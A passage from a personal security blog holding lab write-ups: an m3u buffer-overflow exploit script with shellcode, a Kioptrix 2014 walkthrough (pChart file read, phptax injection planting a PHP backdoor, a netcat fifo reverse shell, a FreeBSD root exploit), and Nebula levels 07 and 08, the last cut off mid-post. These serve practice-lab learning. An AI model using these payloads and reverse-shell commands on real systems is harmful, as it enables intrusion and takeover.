buf += "\x44\x50\x58\x4c\x4b\x30\x58\x47\x54\x33\x31\x59\x43"
buf += "\x43\x56\x4c\x4b\x54\x4c\x50\x4b\x4c\x4b\x46\x38\x35"
buf += "\x4c\x33\x31\x39\x43\x4c\x4b\x44\x44\x4c\x4b\x35\x51"
buf += "\x58\x50\x4c\x49\x30\x44\x47\x54\x36\x44\x31\x4b\x31"
buf += "\x4b\x45\x31\x30\x59\x31\x4a\x46\x31\x4b\x4f\x4b\x50"
buf += "\x51\x4f\x31\x4f\x51\x4a\x4c\x4b\x45\x42\x5a\x4b\x4c"
buf += "\x4d\x51\x4d\x42\x48\x47\x43\x36\x52\x43\x30\x55\x50"
buf += "\x32\x48\x42\x57\x32\x53\x57\x42\x31\x4f\x31\x44\x42"
buf += "\x48\x50\x4c\x54\x37\x37\x56\x34\x47\x4b\x4f\x4e\x35"
buf += "\x48\x38\x4a\x30\x43\x31\x45\x50\x45\x50\x56\x49\x49"
buf += "\x54\x56\x34\x30\x50\x33\x58\x57\x59\x4d\x50\x32\x4b"
buf += "\x35\x50\x4b\x4f\x59\x45\x42\x4a\x53\x38\x51\x49\x36"
buf += "\x30\x5a\x42\x4b\x4d\x57\x30\x46\x30\x57\x30\x30\x50"
buf += "\x32\x48\x5a\x4a\x44\x4f\x59\x4f\x4b\x50\x4b\x4f\x48"
buf += "\x55\x5a\x37\x33\x58\x44\x42\x43\x30\x54\x51\x31\x4c"
buf += "\x4d\x59\x4d\x36\x52\x4a\x44\x50\x51\x46\x46\x37\x32"
buf += "\x48\x39\x52\x49\x4b\x46\x57\x55\x37\x4b\x4f\x39\x45"
buf += "\x30\x57\x45\x38\x58\x37\x5a\x49\x37\x48\x4b\x4f\x4b"
buf += "\x4f\x38\x55\x46\x37\x43\x58\x34\x34\x5a\x4c\x57\x4b"
buf += "\x4d\x31\x4b\x4f\x4e\x35\x31\x47\x5a\x37\x45\x38\x32"
buf += "\x55\x42\x4e\x50\x4d\x43\x51\x4b\x4f\x48\x55\x33\x58"
buf += "\x42\x43\x32\x4d\x32\x44\x43\x30\x4b\x39\x4a\x43\x51"
buf += "\x47\x31\x47\x51\x47\x56\x51\x4c\x36\x42\x4a\x34\x52"
buf += "\x51\x49\x30\x56\x4d\x32\x4b\x4d\x45\x36\x49\x57\x57"
buf += "\x34\x57\x54\x47\x4c\x33\x31\x53\x31\x4c\x4d\x47\x34"
buf += "\x37\x54\x44\x50\x48\x46\x45\x50\x51\x54\x31\x44\x30"
buf += "\x50\x56\x36\x50\x56\x51\x46\x51\x56\x51\x46\x30\x4e"
buf += "\x50\x56\x56\x36\x51\x43\x56\x36\x53\x58\x54\x39\x38"
buf += "\x4c\x57\x4f\x4c\x46\x4b\x4f\x48\x55\x4b\x39\x4d\x30"
buf += "\x50\x4e\x50\x56\x37\x36\x4b\x4f\x46\x50\x52\x48\x43"
buf += "\x38\x4c\x47\x45\x4d\x45\x30\x4b\x4f\x49\x45\x4f\x4b"
buf += "\x4b\x4e\x44\x4e\x47\x42\x4b\x5a\x53\x58\x4e\x46\x4a"
buf += "\x35\x4f\x4d\x4d\x4d\x4b\x4f\x38\x55\x57\x4c\x54\x46"
buf += "\x53\x4c\x45\x5a\x4b\x30\x4b\x4b\x4b\x50\x42\x55\x54"
buf += "\x45\x4f\x4b\x31\x57\x54\x53\x52\x52\x52\x4f\x42\x4a"
buf += "\x35\x50\x50\x53\x4b\x4f\x4e\x35\x41\x41"

with open(r"c:\documents and settings\administrator\desktop\mal.m3u", "w") as file:
    file.write(26064 * "A")
    file.write("\x2a\xb2\xd4\x01") # JMP ESP
    file.write("\x90" * 25) # NOP * 25
    file.write(buf)

print "Done"</pre>
					</div>
<!-- .entry-content -->
		
		<footer class="entry-meta">
			
										<span class="cat-links">
					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/blog/category/exploit/exploit-development/buffer-overflow/" rel="category tag">Buffer Overflow</a>, <a href="/blog/category/exploit/exploit-development/immunity/" rel="category tag">Immunity</a>, <a href="/blog/category/exploit/exploit-development/mona-py/" rel="category tag">mona.py</a>, <a href="/blog/category/uncategorized/" rel="category tag">Uncategorized</a>			</span>
							
										
			
					</footer><!-- .entry-meta -->
	</article><!-- #post-342 -->

				
					
	<article id="post-312" class="post-312 post type-post status-publish format-standard hentry category-exploit category-infosec category-pentest category-php category-shell category-uncategorized category-unix category-web-server">
		<header class="entry-header">
						<h1 class="entry-title"><a href="/blog/kioptrix-2014/" rel="bookmark">Kioptrix 2014</a></h1>
			
						<div class="entry-meta">
				<span class="sep">Posted on </span><a href="/blog/kioptrix-2014/" title="8:48 PM" rel="bookmark"><time class="entry-date" datetime="2017-10-12T20:48:43+00:00">2017-10-12</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/blog/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
<!-- .entry-meta -->
			
					</header><!-- .entry-header -->

				<div class="entry-content">
			<p>My lab time in the PWK course labs ran out a while back and I wasn&#8217;t ready for the exam. I think I understand all the theory that I need, it just takes m e too long to PWN systems, so I decided to try a few Vulnhub VMs. <a href="https://medium.com/@a.hilton83/oscp-training-vms-hosted-on-vulnhub-com-22fa061bf6a1">This article</a> has a list of 10 that I will be trying, the first of which is <a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/">Kioptrix 2014</a>.</p>
<p>There are already walkthroughs all over the web, so I don&#8217;t feel like I&#8217;m giving away any spoilers here. I&#8217;m mostly documenting it for my own notes, but of course it can be used for hints if you&#8217;re going to give it a try.</p>
<p>I wanted to run in in VirtualBox, which requires the use of the extra &#8220;kiop2014_fix.zip&#8221; file as wall as the VMDK from the main kiop2014.tar.bz2</p>
<p>After starting the VM, I had to find the system&#8217;s IP address, so I ran netdiscover and it was quickly found. To find the open ports and identify the services, I ran nmap:</p>
<pre>root@kali:~# nmap [IP-REDACTED] -sV

Starting Nmap 7.40 ( https://nmap.org ) at 2017-10-11 15:59 EDT
Nmap scan report for kioptrix2014.lan ([IP-REDACTED])
Host is up (0.00044s latency).
Not shown: 997 filtered ports
PORT STATE SERVICE VERSION
22/tcp closed ssh
<strong>80/tcp open http Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)</strong>
<strong>8080/tcp open http Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)</strong>
MAC Address: 08:00:27:DC:55:1C (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.66 seconds</pre>
<p>Opening a web browser on port 8080 shows a 403 forbidden error message. Nothing too interesting in the response. The page returned on port 80 is more interesting though&#8230; When rendered, it&#8217;s just a heading that says &#8220;It works!&#8221;, but the source includes a commented out &lt;meta refresh&gt; that would redirect the browser to http://[IP-REDACTED]/pChart2.1.3/examples/index.php.</p>
<p>Initially, I thought I could inject some PHP in here. For example if I went to the sandbox and  changed my chart title to <strong>-&#8220;.shell_exec(&#8220;whoami&#8221;).&#8221;-</strong> then clicked the &#8220;Show code&#8221; button, it showed me that one line of code that would run would be</p>
<pre>$myPicture-&gt;drawText(350,25,"-".shell_exec("whoami")."-",$TextSettings);</pre>
<p>but when I clicked &#8220;Render picture&#8221;, the title was<strong>-&#8220;.shell_exec(&#8220;whoami&#8221;).&#8221;-</strong>, so it must have escaped it somehow when it really made the picture. Damn.</p>
<p>Next thing to try is looking for a known exploit for pChart:</p>
<pre>root@kali:~# searchsploit pchart
--------------------------------------------- ----------------------------------
 Exploit Title | Path
 | (/usr/share/exploitdb/platforms/)
--------------------------------------------- ----------------------------------
pChart 2.1.3 - Multiple Vulnerabilities | php/webapps/31173.txt
--------------------------------------------- ----------------------------------</pre>
<p>That txt file suggests that I can read any file on the system that the account running apache can read using a maliciously crafted url, for example http://[IP-REDACTED]/examples/index.php?Action=View&amp;Script=/etc/passwd</p>
<p>Interestingly, we can see how this exploit works by examining the first line of index.php, which can be seen by visiting http://[IP-REDACTED]/pChart2.1.3/examples/index.php?Action=View&amp;Script=index.php , which is:</p>
<pre>&lt;?php if ( isset($_GET["Action"])) { $Script = $_GET["Script"]; highlight_file($Script); exit(); } ?&gt;</pre>
<p>. We don&#8217;t even really need a value set for &#8220;Action&#8221;; http://[IP-REDACTED]/pChart2.1.3/examples/index.php?<strong>Action</strong>&amp;Script=index.php works just as well.</p>
<p>Anyway, there&#8217;s not much of great interest that this account can access, but perhaps we can find out why we are seeing a 403 forbidden response when we connect to port 8080&#8230;</p>
<p><a href="https://www.freebsd.org/doc/handbook/network-apache.html">The apache config file on FreeBSD is located in /usr/local/etc/apache2x/httpd.conf</a>, (on this system, since it&#8217;s apache 2.2, we should replace the &#8220;x&#8221; with a &#8220;2&#8221;) so we&#8217;ll look at that with http://[IP-REDACTED]/pChart2.1.3/examples/index.php?Action&amp;Script=/usr/local/etc/apache22/httpd.conf and at the bottom of the file is:</p>
<pre>SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser

&lt;VirtualHost *:8080&gt;
    DocumentRoot /usr/local/www/apache22/data2

&lt;Directory "/usr/local/www/apache22/data2"&gt;
    Options Indexes FollowSymLinks
    AllowOverride All
    Order allow,deny
    Allow from env=Mozilla4_browser
&lt;/Directory&gt;</pre>
<p>This tells us that port 8080 is serving files from /usr/local/www/apache22/data2, and that requests will only be allowed if the user agent starts with &#8220;Mozilla/4.0 Mozilla4_browser&#8221; . See https://httpd.apache.org/docs/2.4/mod/mod_setenvif.html and http://httpd.apache.org/docs/current/mod/mod_access_compat.html#allow for more details of how that works.</p>
<p>Changing our user agent to &#8220;Mozilla/4.0 Mozilla4_browser_NOT REALLY!&#8221; makes apache respond to our requests to port 80, and the response says that there is a directory called phptax. This shows us a very ugly and dated web application that I clicked around, but couldn&#8217;t find anything interesting, so I used searchsploit again:</p>
<pre>root@kali:~# searchsploit phptax
------------------------------------------------------------------ ----------------------------------
 Exploit Title | Path
 | (/usr/share/exploitdb/platforms/)
------------------------------------------------------------------ ----------------------------------
PhpTax - pfilez Parameter Exec Remote Code Injection (Metasploit) | php/webapps/21833.rb
phptax 0.8 - Remote Code Execution | php/webapps/21665.txt
PhpTax 0.8 - File Manipulation (newvalue) / Remote Code Execution | php/webapps/25849.txt
------------------------------------------------------------------ ----------------------------------</pre>
<p>The second one looks interesting, it basically says that we can get remote code execution because user input is not sanitised before being used in php&#8217;s exec() function. I&#8217;ll confirm this works by writing a <a href="/blog/single-line-php-script-to-gain-shell/">single line php backdoor file</a> by visiting http://[IP-REDACTED]:8080/phptax/drawimage.php?pfilez=xxx;echo &#8220;&lt;?php echo shell_exec(\$_GET[&#8216;e&#8217;].&#8217; 2&gt;%261&#8242;);?&gt;&#8221;&gt;backdoor.php;&amp;pdf=make in my browser, then http://[IP-REDACTED]:8080/backdoor.php?e=whoami to make sure it worked. It did, and now I can execute shell commands <strong>and see the output</strong></p>
<p>It would be really nice to have a remote shell. I tried using &#8220;nc &lt;IP&gt; &lt;PORT&gt; -e /bin/sh&#8221;, but that didn&#8217;t work and &#8220;nc -h&#8221; showed why; -e is for specifying an IPsec policy (whatever that means) on this version of nc. We&#8217;ll have to try something else; I remember some time ago that I was able to use a named fifo pipe in order to get a shell with nc. This command worked for me to connect to a netcat listener:</p>
<pre>mkfifo pipe;nc [IP ADDR] [PORT]&lt;pipe|/bin/sh&gt;pipe 2&gt;pipe;rm pipe</pre>
<p>Running &#8220;uname -r&#8221; tells us that we&#8217;re on a FreeBSD 9.0 system. Let&#8217;s try to get root. Back to searchsploit:</p>
<pre>root@kali:~# searchsploit -t FreeBSD 9
------------------------------------------------------------------------- ----------------------------------
 Exploit Title | Path
 | (/usr/share/exploitdb/platforms/)
------------------------------------------------------------------------- ----------------------------------
FreeBSD 2.x / HP-UX 9/10/11 / Kernel 2.0.3 / Windows NT 4.0/Server 2003 | multiple/dos/20810.c
FreeBSD 2.x / HP-UX 9/10/11 / Kernel 2.0.3 / Windows NT 4.0/Server 2003 | multiple/dos/20811.cpp
FreeBSD 2.x / HP-UX 9/10/11 / Kernel 2.0.3 / Windows NT 4.0/Server 2003 | windows/dos/20812.c
FreeBSD 2.x / HP-UX 9/10/11 / Kernel 2.0.3 / Windows NT 4.0/Server 2003 | multiple/dos/20813.c
FreeBSD 2.x / HP-UX 9/10/11 / Kernel 2.0.3 / Windows NT 4.0/Server 2003 | windows/dos/20814.c
FreeBSD 9.1 ftpd - Remote Denial of Service | freebsd/dos/24450.txt
FreeBSD mcweject 0.9 (eject) - Buffer Overflow Privilege Escalation | bsd/local/3578.c
BSD/OS 2.1 / DG/UX 4.0 / Debian 0.93 / Digital UNIX 4.0 B / FreeBSD 2.1. | unix/local/19203.c
FreeBSD 9.0 &lt; 9.1 mmap/ptrace - Privilege Escalation | freebsd/local/26368.c
FreeBSD 9 - Address Space Manipulation Privilege Escalation (Metasploit) | freebsd/local/26454.rb
FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation | freebsd/local/28718.c
FreeBSD/x86 - rev connect_ recv_ jmp_ return results Shellcode (90 bytes | freebsd_x86/shellcode/13265.c
FreeBSD/x86 - Rortbind Reverse 127.0.0.1:8000 /bin/sh Shellcode (89 byte | freebsd_x86/shellcode/13267.asm
------------------------------------------------------------------------- ----------------------------------</pre>
<p>26368 looks promising, let&#8217;s send it to the remote machine. I ran this on my attacking machine:</p>
<pre>searchsploit -m 26368;nc -vnlp 6666 &lt;26368.c</pre>
<p>then ran this on the remote system:</p>
<pre>nc 192.168.23.120 6666 &gt;26368.c</pre>
<p>and after a few seconds, I hit CTRL+C to close the nc session. Not I have the exploit on the FreeBSD system, so I can compile it and run it:</p>
<pre>gcc 26368.c -o 26368
./26368
whoami
root</pre>
<p>We&#8217;ve got root! Inside root&#8217;s home directory is a nice txt file with some interesting information that we can read using cat</p>
<p>I recently learned that <a href="http://www.kioptrix.com/blog/farewell-loneferret/">the guy that made this VM (Steven “loneferret” McElrea) passed away a couple of months ago</a>. I&#8217;m grateful for the time he put into making this VM and my thoughts go out to his family.</p>
					</div>
<!-- .entry-content -->
		
		<footer class="entry-meta">
			
										<span class="cat-links">
					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/blog/category/exploit/" rel="category tag">Exploit</a>, <a href="/blog/category/infosec/" rel="category tag">Information Security</a>, <a href="/blog/category/infosec/pentest/" rel="category tag">Penetration Test</a>, <a href="/blog/category/php/" rel="category tag">PHP</a>, <a href="/blog/category/shell/" rel="category tag">Shell</a>, <a href="/blog/category/uncategorized/" rel="category tag">Uncategorized</a>, <a href="/blog/category/unix/" rel="category tag">Unix</a>, <a href="/blog/category/web-server/" rel="category tag">Web Server</a>			</span>
							
										
			
					</footer><!-- .entry-meta -->
	</article><!-- #post-312 -->

				
					
	<article id="post-307" class="post-307 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
						<h1 class="entry-title"><a href="/blog/new-alternate-emoji-domain/" rel="bookmark">New alternate emoji domain</a></h1>
			
						<div class="entry-meta">
				<span class="sep">Posted on </span><a href="/blog/new-alternate-emoji-domain/" title="2:27 PM" rel="bookmark"><time class="entry-date" datetime="2017-08-16T14:27:14+00:00">2017-08-16</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/blog/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
<!-- .entry-meta -->
			
					</header><!-- .entry-header -->

				<div class="entry-content">
			<p>This is not really security related, but it&#8217;s a bit of fun so I wrote a quick post.</p>
<p>I had heard that emoji domains are available from select TLDs, so I decided to buy one! I am now the proud owner of &#x1f4bb;☠.ws, which mirrors this site.</p>
<p>Now, if you go to grobinson.me and your browser supports emoji domains without displaying the punycode translation (xn--h4h3030o.ws) in the address bar, you will be redirected to the same page on &#x1f4bb;☠.ws thanks to <a href="https://github.com/jonroig/emojiurlifier">this little piece of javascript</a>.</p>
<p>Check your address bar now. You may already using the emoji domain without even knowing.</p>
					</div>
<!-- .entry-content -->
		
		<footer class="entry-meta">
			
										<span class="cat-links">
					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/blog/category/uncategorized/" rel="category tag">Uncategorized</a>			</span>
							
										
			
					</footer><!-- .entry-meta -->
	</article><!-- #post-307 -->

				
					
	<article id="post-290" class="post-290 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
						<h1 class="entry-title"><a href="/blog/hack-the-box/" rel="bookmark">Hack the Box</a></h1>
			
						<div class="entry-meta">
				<span class="sep">Posted on </span><a href="/blog/hack-the-box/" title="4:33 PM" rel="bookmark"><time class="entry-date" datetime="2017-06-26T16:33:20+00:00">2017-06-26</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/blog/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
<!-- .entry-meta -->
			
					</header><!-- .entry-header -->

				<div class="entry-content">
			<p>I recently came across <a href="https://www.hackthebox.eu/">Hack The Box</a> and have been having fun pwning some of those machines using the techniques that I have learned in the free <a href="https://www.offensive-security.com/metasploit-unleashed/">Metasploit Unleashed</a> course. Metasploit really is a great tool, and even though I could have got some &#8220;user owns&#8221; without it, I found that once I had learned how to use things like msfvenom, it saved me having to write some of my own trivial scripts, which saved me time.</p>
<p>I&#8217;ve currently got 3 &#8220;System Owns&#8221; and 4 &#8220;User Owns&#8221;, which puts me on &#8220;Script Kiddie&#8221; status. I&#8217;m hoping to get a few more and move to a better status fairly quickly, if I can find the time to play around some more.</p>
<p>I especially like the way you have to <a href="https://www.hackthebox.eu/en/invite">hack the invite</a> before you can gain access to any machines. It was probably the easiest part of any of the challenges I have attempted, but that might be because I&#8217;m pretty familiar with web technologies.</p>
<p>If you haven&#8217;t tried it out, I would encourage you to do so. The website is <strong>very</strong> polished, and there are quite a lot of machines to attack 🙂</p>
					</div>
<!-- .entry-content -->
		
		<footer class="entry-meta">
			
										<span class="cat-links">
					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/blog/category/uncategorized/" rel="category tag">Uncategorized</a>			</span>
							
										
			
					</footer><!-- .entry-meta -->
	</article><!-- #post-290 -->

				
					
	<article id="post-238" class="post-238 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
						<h1 class="entry-title"><a href="/blog/i-have-a-raspberry-pi-on-the-way/" rel="bookmark">I have a Raspberry PI on the way</a></h1>
			
						<div class="entry-meta">
				<span class="sep">Posted on </span><a href="/blog/i-have-a-raspberry-pi-on-the-way/" title="4:39 PM" rel="bookmark"><time class="entry-date" datetime="2013-01-06T16:39:02+00:00">2013-01-06</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/blog/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
<!-- .entry-meta -->
			
					</header><!-- .entry-header -->

				<div class="entry-content">
			<p>I ordered a Raspberry PI yesterday.</p>
<p>I used to have a server running at home which served files, recorded tv, provided VPN, but I moved into a small flat, and there&#8217;s not much room for a server, not that my fiancée would be happy with anyway!</p>
<p>The PI will give me a little server back again for the duration that I&#8217;m in this flat. I&#8217;m also looking at playing with xbmc and perhaps some pvr capabilities on it. Should be fun!</p>
					</div>
<!-- .entry-content -->
		
		<footer class="entry-meta">
			
										<span class="cat-links">
					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/blog/category/uncategorized/" rel="category tag">Uncategorized</a>			</span>
							
										
			
					</footer><!-- .entry-meta -->
	</article><!-- #post-238 -->

				
					
	<article id="post-222" class="post-222 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
						<h1 class="entry-title"><a href="/blog/exploit-exercises-nebula-level-08/" rel="bookmark">Exploit Exercises – Nebula – Level 08</a></h1>
			
						<div class="entry-meta">
				<span class="sep">Posted on </span><a href="/blog/exploit-exercises-nebula-level-08/" title="12:17 PM" rel="bookmark"><time class="entry-date" datetime="2012-12-01T12:17:44+00:00">2012-12-01</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/blog/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
<!-- .entry-meta -->
			
					</header><!-- .entry-header -->

				<div class="entry-content">
			<p>I must admit I needed a bit of help with his one, I had most of it but not quite all. It started with the following information:</p>
<p style="text-align: left; padding-left: 30px;">World readable files strike again. Check what that user was up to, and use it to log into flag08 account.<br>
To do this level, log in as the level08 account with the password level08 . Files for this level can be found in /home/flag08.</p>
<p style="text-align: left;">So in ~flag08 there is one file of interest; capture.pcap. This is some captured network traffic. I copied this file onto my Macbook and opened it up in wireshark and spent some time looking through it. I found some interesting information like frame 43 contained a password prompt (the text &#8220;Password:&#8221;) from the server, followed by an ack from the client, then all subsequent packet exchanges contained 1 byte of TCP payload data from the client followed by an empty TCP ack packet from the server. Going through the packets, I could see that the user had sent: &#8220;backdoor&#8230;00Rm8.ate.&#8221; and then the server had replied &#8220;Login incorrect&#8221;. If we right click on a packet in the stream and select Follow TCP stream, we can see this a bit clearer.</p>
<p style="text-align: left;">But &#8220;backdoor&#8230;00Rm8.ate.&#8221; is not the password for flag08&#8217;s account, we need more investigation. While in the Follow TCP stream view, I selected hex dump view, and I can see that all the dots are not the same byte. Presumably they are all ascii, so I checked the ascii codes; 7f=backspace, 0d=Carriage-return.</p>
<p style="text-align: left;">So the password was &#8220;backd00Rmate&#8221;, this just so happens to be the password for flag08&#8217;s account.</p>
<p style="text-align: left;">
					</p>
</div>
<!-- .entry-content -->
		
		<footer class="entry-meta">
			
										<span class="cat-links">
					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/blog/category/uncategorized/" rel="category tag">Uncategorized</a>			</span>
							
										
			
					</footer><!-- .entry-meta -->
	</article><!-- #post-222 -->

				
					
	<article id="post-218" class="post-218 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
						<h1 class="entry-title"><a href="/blog/exploit-exercises-nebula-level-07/" rel="bookmark">Exploit Exercises – Nebula – Level 07</a></h1>
			
						<div class="entry-meta">
				<span class="sep">Posted on </span><a href="/blog/exploit-exercises-nebula-level-07/" title="11:58 AM" rel="bookmark"><time class="entry-date" datetime="2012-12-01T11:58:49+00:00">2012-12-01</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/blog/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
<!-- .entry-meta -->
			
					</header><!-- .entry-header -->

				<div class="entry-content">
			<p>This one starts with the following information:</p>
<p style="padding-left: 30px;">The <em>flag07</em> user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.</p>
<p>and Source code:</p>

<div class="wp_syntax" style="position:relative;">
<table><tr>
<td class="line_numbers"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td>
<td class="code"><pre class="perl" style="font-family:monospace;"><span style="color: #666666; font-style: italic;">#!/usr/bin/perl</span>
&nbsp;
<span style="color: #000000; font-weight: bold;">use</span> CGI <span style="color: #000066;">qw</span><span style="color: #009900;">&#123;</span>param<span style="color: #009900;">&#125;</span><span style="color: #339933;">;</span>
&nbsp;
<span style="color: #000066;">print</span> <span style="color: #ff0000;">&quot;Content-type: text/html<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">;</span>
&nbsp;
<span style="color: #000000; font-weight: bold;">sub</span> ping <span style="color: #009900;">&#123;</span>
    <span style="color: #0000ff;">$host</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">$_</span><span style="color: #009900;">&#91;</span><span style="color: #cc66cc;">0</span><span style="color: #009900;">&#93;</span><span style="color: #339933;">;</span>
&nbsp;
    <span style="color: #000066;">print</span><span style="color: #009900;">&#40;</span><span style="color: #ff0000;">&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;&quot;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
&nbsp;
    <span style="color: #0000ff;">@output</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">`ping -c 3 $host 2&gt;&amp;1`</span><span style="color: #339933;">;</span>
    <span style="color: #b1b100;">foreach</span> <span style="color: #0000ff;">$line</span> <span style="color: #009900;">&#40;</span><span style="color: #0000ff;">@output</span><span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span> <span style="color: #000066;">print</span> <span style="color: #ff0000;">&quot;$line&quot;</span><span style="color: #339933;">;</span> <span style="color: #009900;">&#125;</span> 
&nbsp;
    <span style="color: #000066;">print</span><span style="color: #009900;">&#40;</span><span style="color: #ff0000;">&quot;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
&nbsp;
<span style="color: #009900;">&#125;</span>
&nbsp;
<span style="color: #666666; font-style: italic;"># check if Host set. if not, display normal page, etc</span>
&nbsp;
ping<span style="color: #009900;">&#40;</span>param<span style="color: #009900;">&#40;</span><span style="color: #ff0000;">&quot;Host&quot;</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span></pre></td>
</tr></table>
<p class="theCode" style="display:none;">#!/usr/bin/perl

use CGI qw{param};

print &quot;Content-type: text/html\n\n&quot;;

sub ping {
    $host = $_[0];

    print(&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;&quot;);

    @output = `ping -c 3 $host 2&gt;&amp;1`;
    foreach $line (@output) { print &quot;$line&quot;; } 

    print(&quot;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;&quot;);

}

# check if Host set. if not, display normal page, etc

ping(param(&quot;Host&quot;));</p>
</div>

<p>We can see that the flag07 user has an thttpd.conf file in his directory, indicating that he has a http daemon or (web server) running. This is further compounded by the fact that he has a perl script (index.cgi) in his home directory.</p>
<p>In the thttpd.conf file it tells us that the web server is running on port 7007. I didn&#8217;t want to exit the VM, which meant that I didn&#8217;t have a web browser, but I do have wget which allows me to make http requests from the command line so I ran:</p>

<div class="wp_syntax" style="position:relative;">
<table><tr><td class="code"><pre class="bash" style="font-family:monospace;"><span style="color: #c20cb9; font-weight: bold;">wget</span> <span style="color: #660033;">-O-</span> http:<span style="color: #000000; font-weight: bold;">//</span>localhost:<span style="color: #000000;">7007</span><span style="color: #000000; font-weight: bold;">/</span>index.cgi</pre></td></tr></table>
<p class="theCode" style="display:none;">wget -O- http://localhost:7007/index.cgi</p>
</div>

<p>and got some output telling me how to use ping (because it hadn&#8217;t been given sufficient arguments. From the perl code, I could see that it wants a variable submitted as &#8220;Host&#8221;. It looks like it will use this as the machine name to ping. This time I tried:</p>

<div class="wp_syntax" style="position:relative;">
<table><tr><td class="code"><pre class="bash" style="font-family:monospace;"><span style="color: #c20cb9; font-weight: bold;">wget</span> <span style="color: #660033;">-O-</span> http:<span style="color: #000000; font-weight: bold;">//</span>localhost:<span style="color: #000000;">7007</span><span style="color: #000000; font-weight: bold;">/</span>index.cgi?<span style="color: #007800;">Host</span>=localhost</pre></td></tr></table>
<p class="theCode" style="display:none;">wget -O- http://localhost:7007/index.cgi?Host=localhost</p>
</div>

<p>and got back ping results, but I need to get this script to do something other than ping&#8230; I can see that the ping command is just a string with the submitted host name &#8220;injected&#8221; into it. There is no input sanitisation going on, so it is ripe for some code injection.</p>
<p>I could get the script to copy my elevated-shell-launcher program and thenset the setuid bit like I did in level 03, but this challenge reminded me of something I learned while playing with DVWA (using netcat to send shell over the network) so I tried that method instead. The url I need to load would submit the following as the Host variable:</p>

<div class="wp_syntax" style="position:relative;">
<table><tr><td class="code"><pre class="bash" style="font-family:monospace;">;<span style="color: #c20cb9; font-weight: bold;">mkfifo</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>pipe;<span style="color: #c20cb9; font-weight: bold;">cat</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>pipe<span style="color: #000000; font-weight: bold;">|</span><span style="color: #c20cb9; font-weight: bold;">bash</span><span style="color: #000000; font-weight: bold;">|</span>nc <span style="color: #660033;">-l</span> <span style="color: #000000;">4444</span> <span style="color: #000000;">2</span><span style="color: #000000; font-weight: bold;">&amp;</span>gt;<span style="color: #000000; font-weight: bold;">&amp;</span>amp;<span style="color: #000000;">1</span><span style="color: #000000; font-weight: bold;">&amp;</span>gt;<span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>pipe;<span style="color: #c20cb9; font-weight: bold;">rm</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>fifo;</pre></td></tr></table>
<p class="theCode" style="display:none;">;mkfifo /tmp/pipe;cat /tmp/pipe|bash|nc -l 4444 2&amp;gt;&amp;amp;1&amp;gt;/tmp/pipe;rm /tmp/fifo;</p>
</div>

<p>When injected to the command that is run in the perl script, to actual command that is executed will be:</p>

<div class="wp_syntax" style="position:relative;">
